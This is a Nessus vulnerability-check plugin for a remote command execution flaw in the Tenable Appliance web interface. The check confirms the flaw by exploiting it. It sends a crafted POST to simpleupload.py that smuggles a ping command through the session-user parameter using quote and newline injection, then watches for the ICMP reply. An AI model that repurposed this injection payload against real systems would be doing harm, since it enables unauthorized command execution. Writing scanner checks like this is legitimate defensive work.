#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(99595);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/04/25 13:23:28 $");

  script_osvdb_id(153135);
  script_xref(name:"EDB-ID", value:"41892");

  script_name(english:"Tenable Appliance < 4.5.0 Web UI simpleupload.py Remote Command Execution (TNS-2017-07)");
  script_summary(english:"Tries to execute a command via simpleupload.py.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a remote command execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Tenable Appliance host is affected by a remote command
execution vulnerability in the web user interface in the
simpleupload.py script due to improper validation of user-supplied
input. An unauthenticated, remote attacker can exploit this, via the
'tns_appliance_session_user' parameter, to execute arbitrary commands.");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/tns-2017-07");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Tenable Appliance version 4.5.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/03/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/03/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/04/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:tenable:appliance");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("tenable_appliance_web_detect.nasl");
  script_require_keys("www/tenable_appliance");
  script_require_ports("Services/www", 8000);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:8000);
install = get_install_from_kb(appname:'tenable_appliance', port:port, exit_on_fail:TRUE);
install_url = build_url(qs:'/', port:port);

appname = "Tenable Appliance";

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, appname);

command = "ping -nc 10 " + this_host();
data = 'returnpage=/&action=a&tns_appliance_session_token=61:62&tns_appliance_session_user=a"\\\'%0a' +
       command +
       '%0aecho';

http_request = 'POST /simpleupload.py HTTP/1.0\r\n' +
               'Host: ' + get_host_ip() + ':' + port + '\r\n' +
               'Content-Type: application/x-www-form-urlencoded\r\n' +
               'Content-Length: ' + len(data) + '\r\n' +
               '\r\n' +
               data;

filter = "icmp and icmp[0] = 8 and src host " + get_host_ip();
response = send_capture(socket:soc, data:http_request, pcap_filter:filter);
icmp = tolower(hexstr(get_icmp_element(icmp:response, element:"data")));
close(soc);

# No response, meaning it did not work
if(isnull(icmp)) audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);

report =
  '\nNessus was able to exploit a remote command execution vulnerability' +
  '\nby sending a crafted request.' +
  '\n';
security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
